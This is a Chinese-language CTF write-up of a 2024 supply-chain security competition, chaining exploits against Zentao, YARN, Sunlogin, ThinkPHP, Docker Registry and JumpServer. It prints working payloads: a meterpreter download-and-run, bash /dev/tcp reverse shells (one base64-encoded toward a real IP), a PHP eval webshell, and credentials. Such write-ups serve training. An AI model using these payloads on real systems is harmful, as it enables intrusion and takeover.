---
title: 2024 软件供应链安全技能竞赛官方 WriteUp（4 网段 14 flag 综合渗透）
contest: 2024 软件供应链安全技能竞赛
year: 2024
difficulty: hard
vuln_type: [rce, ssti, lfi, auth_bypass, ssrf, deserialize, web_unknown]
tags: [禅道 Zentao RCE v18.0.beta1, YARN REST API new-application, 向日葵 RCE CVE-2022-10270, ThinkPHP5 invokefunction, jumpserver Celery 模板注入, Docker Registry 5000/_catalog, Socks5 代理, frida Java.choose, docker pull 私有镜像, Bash /dev/tcp 反弹, ansible delegate_to localhost, Apache Druid 命令执行]
attack_chain:
  - flag1: 禅道 Zentao v18.0.beta1 captcha RCE + curl /tmp/a + chmod + /bin/bash
  - flag2: cat /www/zentaopms/config/my.php 拿 admin@mail.yym1ng.com/1qazcde3!@#
  - flag3: YARN ws/v1/cluster/apps am-container-spec command bash -i /dev/tcp
  - flag4: ftp wsfxsdfrsaqwczdsa (windows 192.168.10.55)
  - flag5: 向日葵 sunlogin_rce + reg fDenyTSConnections=0 + Guest 启用+Admin@123
  - flag6: yujianxg MZCiP6gfusWj3
  - flag7: Java.perform frida Java.choose java.lang.String 凭据 dump
  - flag8: admin/123456 默认口令
  - flag9: thinkphp s=/api/thinkapp/invokefunction call_user_func_array file_put_contents a.php
  - flag10: ThinkPHP call_user_func_array passthru bash base64
  - flag11: Docker registry /v2/_catalog + insecure-registries + auth=base64
  - flag12: admin gygsud7gbskdbbxd3rtqak
  - flag13: jumpserver /manage/script 模板注入 bash base64 ansible delegate_to=localhost
  - flag14: jumpserver 模板编辑命令执行
key_payload: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port -f elf > a"
one_liner: 14 flag 全网段综合：禅道/YARN/向日葵/ThinkPHP/Docker Registry/jumpserver 模板/ThinkPHP 链——把企业软件开发-测试-生产-运营商四段打通到底。
lesson: 软件供应链靶场核心是「开源自带漏洞 + 默认口令 + 内网横向」：禅道/向日葵/jumpserver 几乎年年有未授权 RCE；YARN REST API 默认 8088 暴露就送 shell；Docker Registry 5000 端口 + auth=base64(user:pass) 是无认证的私有镜像金库。
quality: high
---

# 2024 软件供应链安全技能竞赛官方 WriteUp

主办方为中国铁塔/电信/移动/联通，凌武科技提供平台。50 支队伍，4 网段（生产/测试/开发运维/运营商）综合渗透。

## flag1：禅道 v18.0.beta1 RCE
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf > a
python3 -m http.server local_port_2
./zentao -c "curl http://.../a -o /tmp/a" -u http://target:zentao_port
./zentao -c "chmod 777 /tmp/a" -u http://target:zentao_port
./zentao -c "/bin/bash /tmp/a" -u http://target:zentao_port
```

## flag2：禅道 my.php
`cat /www/zentaopms/config/my.php` → 凭据 `admin@mail.yym1ng.com / 1qazcde3!@#`，代理进内网扫到邮箱服务器。

## flag3：YARN REST API
```python
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)  # 拿 application-id
requests.post(target+'ws/v1/cluster/apps', json={
    'application-id': app_id,
    'am-container-spec': {'commands': {'command': 'bash -i >& /dev/tcp/.../9999 0>&1'}},
    'application-type': 'YARN'})
```

## flag4：FTP 弱口令
`ftp wsfxsdfrsaqwczdsa`（无用户名 / 全作为口令，hint 是 192.168.10.55 Windows）。

## flag5：向日葵远控 RCE
连 VPN 后扫到向日葵 → `sunlogin_rce`（CVE-2022-10270）→ 远程桌面开 + 防火墙关 + Guest 用户启用 + Admin@123 改密 + 加入 administrators。

## flag6-8：默认凭据/业务配置
- flag6: yujianxg / MZCiP6gfusWj3  
- flag7: Java.perform frida `Java.choose("java.lang.String", { onMatch: print instance })` 凭据 dump  
- flag8: admin/123456

## flag9-10：ThinkPHP5 invokefunction
```
?s=/api/thinkapp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=
?s=/api/thinkapp/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw|base64 -d|bash
```

## flag11：Docker Registry 5000
```bash
curl -u pineapple:123qwe2wsxcde3 http://10.10.100.43:5000/v2/_catalog
# repositories: ["flag", "myapp", "spring-boot-minio", "ubuntu"]
docker pull 10.10.100.43:5000/flag:latest
docker run -itd --name flag-test 10.10.100.43:5000/flag:latest /bin/bash
```
配合 `/etc/docker/daemon.json` 加 `insecure-registries` + `~/.docker/config.json` 的 auth base64。

## flag12-14：jumpserver 模板注入
flag12 凭据 admin/gygsud7gbskdbbxd3rtqak；flag13 走 `/manage/script` 模板编辑页注入：
```yaml
- name: RCE playbook
  hosts: all
  tasks:
    - name: this runs in Celery container
      shell: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIxLjIwNy4zMS8xMjM0IDA+JjE=|base64 -d|bash -i
      delegate_to: localhost
  vars:
    ansible_connection: local
```
flag14 同 `/manage/script` 模板编辑命令执行。
